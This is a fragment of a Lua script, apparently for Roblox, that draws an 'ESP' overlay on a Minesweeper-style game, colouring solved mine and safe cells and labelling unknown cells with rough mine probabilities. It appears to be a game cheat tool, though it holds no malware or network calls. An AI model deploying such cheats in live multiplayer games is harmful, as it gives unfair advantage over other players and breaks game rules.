local espParts = {}
local espEnabled = false
local probEnabled = false
local lastMineCount = -1
local lastSafeCount = -1

local function clearESP()
    for _, entry in pairs(espParts) do
        pcall(function() entry.indicator:Destroy() end)
        if entry.label then pcall(function() entry.label:Destroy() end) end
    end
    espParts = {}
end

local function makeIndicator(part, color, labelText)
    local indicator = Instance.new("Part")
    indicator.Size = Vector3.new(part.Size.X - 0.1, 0.15, part.Size.Z - 0.1)
    indicator.CFrame = CFrame.new(part.Position + Vector3.new(0, part.Size.Y / 2 + 0.1, 0))
    indicator.Anchored = true
    indicator.CanCollide = false
    indicator.CanQuery = false
    indicator.CanTouch = false
    indicator.CastShadow = false
    indicator.Material = Enum.Material.Neon
    indicator.Color = color
    indicator.Transparency = 0.2
    indicator.Parent = workspace

    local bb = nil
    if labelText then
        bb = Instance.new("BillboardGui")
        bb.Size = UDim2.new(0, 40, 0, 20)
        bb.StudsOffset = Vector3.new(0, 1.5, 0)
        bb.AlwaysOnTop = true
        bb.Parent = indicator
        local tl = Instance.new("TextLabel")
        tl.Size = UDim2.new(1, 0, 1, 0)
        tl.BackgroundTransparency = 1
        tl.TextColor3 = Color3.fromRGB(255, 255, 255)
        tl.TextStrokeTransparency = 0
        tl.Font = Enum.Font.GothamBold
        tl.TextSize = 13
        tl.Text = labelText
        tl.Parent = bb
    end

    table.insert(espParts, { indicator = indicator, original = part, label = bb })
end

local function calcProbabilities(mines, safe, allParts, posMap, gridSize)
    local probs = {}

    local function getNeighbors(part)
        local neighbors = {}
        local px, pz = part.Position.X, part.Position.Z
        local offsets = {
            {gridSize,0},{-gridSize,0},{0,gridSize},{0,-gridSize},
            {gridSize,gridSize},{gridSize,-gridSize},
            {-gridSize,gridSize},{-gridSize,-gridSize}
        }
        for _, off in ipairs(offsets) do
            local n = posMap[math.round(px+off[1])..","..math.round(pz+off[2])]
            if n then table.insert(neighbors, n) end
        end
        return neighbors
    end

    -- For each unknown cell, look at all revealed neighbors
    -- Each revealed number gives a constraint: remaining/unrevealedNeighbors = probability
    -- Take the MAX probability from all constraints touching this cell
    for _, part in ipairs(allParts) do
        if not isRevealed(part) and not isFlagged(part) and not mines[part] and not safe[part] then
            local maxProb = 0
            local hasConstraint = false

            local neighbors = getNeighbors(part)
            for _, n in ipairs(neighbors) do
                if isRevealed(n) then
                    local num = getNumber(n)
                    if num and num > 0 then
                        -- Count unrevealed unflagged neighbors of this number
                        local nNeighbors = getNeighbors(n)
                        local unflagged = 0
                        local flagged = 0
                        for _, nn in ipairs(nNeighbors) do
                            if not isRevealed(nn) then
                                if isFlagged(nn) then
                                    flagged = flagged + 1
                                else
                                    unflagged = unflagged + 1
                                end
                            end
                        end
                        local remaining = num - flagged
                        if unflagged > 0 and remaining > 0 then
                            local p = math.min(100, math.floor((remaining / unflagged) * 100))
                            if p > maxProb then maxProb = p end
                            hasConstraint = true
                        end
                    end
                end
            end

            if hasConstraint then
                probs[part] = maxProb
            end
            -- No constraint = don't show (no neighbors revealed yet)
        end
    end
    return probs
end

-- Cleanup thread
task.spawn(function()
    while true do
        task.wait(0.1)
        for i = #espParts, 1, -1 do
            local entry = espParts[i]
            if not entry.original or not entry.original.Parent then
                pcall(function() entry.indicator:Destroy() end)
                table.remove(espParts, i)
            elseif isRevealed(entry.original) then
                pcall(function() entry.indicator:Destroy() end)
                table.remove(espParts, i)
            end
        end
    end
end)

local function updateESP()
    if not espEnabled then return end

    local mines, safe = solveMines()
    local allParts = getAllParts()

    local mineCount = 0
    local safeCount = 0
    for _ in pairs(mines) do mineCount = mineCount + 1 end
    for _ in pairs(safe) do safeCount = safeCount + 1 end

    if mineCount == lastMineCount and safeCount == lastSafeCount then
        return mineCount, safeCount
    end
    lastMineCount = mineCount
    lastSafeCount = safeCount
    clearESP()

    -- Build posMap for probability calc
    local posMap = {}
    local gridSize = 5
    if #allParts > 0 then
        gridSize = math.floor(math.max(allParts[1].Size.X, allParts[1].Size.Z) + 0.5)
    end
    for _, p in ipairs(allParts) do
        posMap[math.round(p.Position.X)..","..math.round(p.Position.Z)] = p
    end

    local probs = probEnabled and calcProbabilities(mines, safe, allParts, posMap, gridSize) or {}

    -- RED = 100% mine
    for part in pairs(mines) do
        if part and part.Parent then
            local lbl = probEnabled and "BOMB" or nil
            makeIndicator(part, Color3.fromRGB(255, 0, 0), lbl)
        end
    end

    -- GREEN = 100% safe
    for part in pairs(safe) do
        if part and part.Parent and not mines[part] then
            local lbl = probEnabled and "SAFE" or nil
            makeIndicator(part, Color3.fromRGB(0, 255, 0), lbl)
        end
    end

    -- PROBABILITY for unknown cells
    if probEnabled then
        for _, part in ipairs(allParts) do
            if not isRevealed(part) and not isFlagged(part) and not mines[part] and not safe[part] then
                local prob = probs[part]
                if prob then
                    -- Color gradient: green=0% yellow=50% red=100%
                    local r, g
                    if prob <= 50 then
                        r = math.floor(prob * 5.1)
                        g = 255
                    else
                        r = 255
                        g = math.floor((100 - prob) * 5.1)
                    end
                    local color = Color3.fromRGB(r, g, 0)
                    makeIndicator(part, color, prob .. "%")
                end
            end
        end
    end

    return mineCount, safeCount
end

